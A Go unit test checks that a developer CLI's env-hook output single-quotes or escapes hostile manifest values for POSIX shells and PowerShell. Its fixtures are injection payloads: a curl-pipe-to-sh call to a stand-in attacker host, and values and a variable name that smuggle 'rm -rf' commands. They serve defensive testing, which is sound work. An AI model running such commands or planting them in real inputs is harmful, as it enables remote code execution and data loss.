package cli

import (
	"strings"
	"testing"

	envpkg "github.com/xmdemt/xdev/internal/env"
)

// TestEnvOutput_QuotesHostileValues guards the C-1 fix: `xdev env` output
// is eval'd by the user. Manifest env_vars values containing $, backticks,
// double quotes or $(...) must never appear in executable form — the
// shared HookOutput path single-quotes (POSIX) or escapes (PowerShell).
func TestEnvOutput_QuotesHostileValues(t *testing.T) {
	vars := map[string]string{
		"MYTOOL_HOME": "$(curl http://evil.example/pwn.sh|sh)",
		"EVIL_QUOTES": `x"; rm -rf ~#`,
		"OK_VALUE":    "C:\\XDev\\install\\tool",
	}
	out := envpkg.HookOutput("sh", nil, vars)
	if !strings.Contains(out, `'$(curl http://evil.example/pwn.sh|sh)'`) {
		t.Errorf("POSIX output must single-quote command substitution payload, got:\n%s", out)
	}
	if strings.Contains(out, "\"$(curl") {
		t.Errorf("unquoted command substitution leaked into POSIX output:\n%s", out)
	}
	ps := envpkg.HookOutput("powershell", nil, vars)
	if !strings.Contains(ps, "`$(curl") {
		t.Errorf("PowerShell output must escape $ with backtick:\n%s", ps)
	}
	if strings.Contains(ps, `x";`) {
		t.Errorf("unescaped double-quote leaked into PowerShell output:\n%s", ps)
	}
	// Invalid env-var names must be skipped entirely (no injection via key).
	bad := envpkg.HookOutput("sh", nil, map[string]string{"A; rm -rf /": "1"})
	if strings.Contains(bad, "rm -rf") {
		t.Errorf("invalid env var name leaked into output:\n%s", bad)
	}
}
